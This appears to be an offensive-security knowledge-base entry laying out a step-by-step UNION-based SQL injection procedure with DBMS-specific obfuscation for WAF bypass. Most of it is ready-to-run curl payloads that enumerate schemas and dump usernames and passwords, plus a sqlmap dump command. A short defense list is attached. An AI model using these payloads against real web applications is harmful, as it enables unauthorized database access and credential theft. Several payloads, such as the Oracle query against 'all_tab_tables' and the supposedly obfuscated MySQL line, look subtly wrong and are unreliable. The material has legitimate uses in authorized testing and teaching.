---
type: procedure
description: >-
  Exploit SQL injection vulnerabilities using UNION-based techniques obfuscated
  for specific DBMS to bypass WAFs and extract sensitive data.
verified: true
submitted: false
created_at: '2023-04-06T03:56:36.803147+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/Obfuscation by DBMS]]'
  - '[[tags/SQL Injection]]'
  - '[[tags/WAF Bypass]]'
commands:
  - '[[commands/curl-manual-union-injection]]'
tools:
  - '[[tools/sqlmap]]'
platforms:
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Union-Based-SQL-Injection-with-DBMS-Obfuscation

## Summary

This procedure demonstrates how to perform a union-based SQL injection attack with DBMS-specific obfuscation techniques to evade web application firewalls (WAFs) and extract sensitive information from vulnerable web applications. It involves identifying injectable parameters, determining the number of columns, and injecting obfuscated UNION SELECT payloads tailored to databases like MySQL and Oracle, allowing attackers to retrieve data from system tables such as information_schema.

## Description

Union-based SQL injection exploits vulnerabilities in web applications where user input is not properly sanitized, allowing attackers to append a malicious UNION SELECT statement to the original query. This combines the legitimate query results with attacker-controlled data, enabling extraction of database schema, tables, columns, and sensitive records. Obfuscation techniques, such as using comments, hexadecimal encoding, null bytes, or DBMS-specific syntax (e.g., MySQL's /*! */ or Oracle's CHR() functions), help bypass WAFs that filter common SQL keywords. This procedure targets public-facing web applications using SQL backends like MySQL or Oracle, assuming the attacker has network access to the target URL. Success leads to data exfiltration, potentially enabling further lateral movement or privilege escalation if database credentials are obtained.

## Requirements

1. Network access to a vulnerable web application with a SQL backend (e.g., MySQL, Oracle).
2. Knowledge of basic SQL syntax and injection principles.
3. Tools like [[tools/sqlmap]] for automated testing or curl/Burp Suite for manual injection.
4. A proxy tool like Burp Suite to intercept and modify requests if needed.
5. Identification of an injectable parameter (e.g., via error-based or boolean blind SQLi first).

## Defense

- Implement parameterized queries and prepared statements in application code to separate SQL logic from user input.
- Deploy and configure WAFs with custom rules to detect anomalous SQL patterns, including obfuscated payloads.
- Regularly audit and patch web applications, using tools like OWASP ZAP or sqlmap for vulnerability scanning.
- Enable database logging and monitor for unusual queries involving UNION or system tables.
- Use input validation, escaping, and web application firewalls with machine learning-based anomaly detection.

## Objectives

1. Bypass input validation and WAF protections using obfuscated UNION SELECT payloads.
2. Extract database schema information (tables, columns) from information_schema or equivalent system views.
3. Retrieve sensitive data such as user credentials or application data for further exploitation.
4. Achieve unauthorized access to the database backend, potentially leading to full compromise.

## Instructions

### Step 1: Identify Vulnerable Parameter and Determine Column Count

**Context**: Begin by confirming SQL injection in a parameter (e.g., search query in a URL). Use order-by or similar to find the number of columns in the original query, as UNION requires matching columns.

**Command** ([[commands/curl-manual-union-injection]]):
```bash
curl -X GET "$_TARGET_URL?id=1' ORDER BY 1--" -v
curl -X GET "$_TARGET_URL?id=1' ORDER BY 10--" -v  # Increment until error
```

> This step tests the injection point. If ORDER BY N succeeds up to M columns but fails at M+1, the query has M columns. Use single quotes to close the string and -- for comment. Expected: No error for correct count, SQL error for too many columns.

### Step 2: Inject Basic UNION SELECT to Verify Compatibility

**Context**: Append a UNION SELECT with null values to match columns, confirming the injection works without errors. This verifies the DBMS type indirectly through response behavior.

**Command** ([[commands/curl-manual-union-injection]]):
```bash
curl -X GET "$_TARGET_URL?id=1' UNION SELECT 1,2,3--" -v  # Adjust columns to match
```

> Replace numbers with column count. If the response includes the injected values (e.g., '1,2,3' in output), injection succeeds. This step confirms union compatibility before obfuscation. Expected: Injected values appear in the application's output.

### Step 3: Apply DBMS-Specific Obfuscation and Extract Schema

**Context**: Use obfuscated payloads from [[codes/MySQL-Union-Select-Obfuscation-Examples]] for MySQL or [[codes/Oracle-Union-Select-Obfuscation-Payloads]] for Oracle to bypass WAFs. Target system tables like information_schema.tables to enumerate databases and tables.

**Command** ([[commands/curl-manual-union-injection]]):
```bash
curl -X GET "$_TARGET_URL?id=-1' UNION SELECT table_name, column_name, 'extracted' FROM information_schema.tables--" -v
# For obfuscated MySQL example:
curl -X GET "$_TARGET_URL?id=1e0' UNION SELECT 2--" -v
# For Oracle:
curl -X GET "$_TARGET_URL?id=1' UNION SELECT CHR(116)||CHR(97)||CHR(98) FROM all_tab_tables--" -v
```

> Embed payloads from the codes, adjusting for column count. For MySQL, use comments like /*! */ or hex; for Oracle, CHR() or null bytes. Iterate to dump tables, then columns from information_schema.columns. Expected: Schema data (e.g., table names) returned in the response.

### Step 4: Extract Sensitive Data

**Context**: Once schema is known, query specific tables for data, using obfuscation if needed. Verify extraction with sample queries.

**Command** ([[commands/curl-manual-union-injection]]):
```bash
curl -X GET "$_TARGET_URL?id=-1' UNION SELECT username, password, 'users' FROM users--" -v
```

> Replace with actual table/columns. Use LIMIT for large tables. Expected: Sensitive records (e.g., usernames and hashed passwords) in the output, confirming successful exfiltration.

### Step 5: Automate with sqlmap if Manual Fails

**Context**: If manual injection is blocked, use [[tools/sqlmap]] with union options for automation, specifying DBMS and tamper scripts for obfuscation.

**Command** (via [[tools/sqlmap]]):
```bash
sqlmap -u "$_TARGET_URL" --dbms=mysql --technique=U --tables -T users --dump
```

> The --technique=U forces union-based. Add --tamper=space2comment for obfuscation. Expected: sqlmap outputs detected tables and dumps data to file.
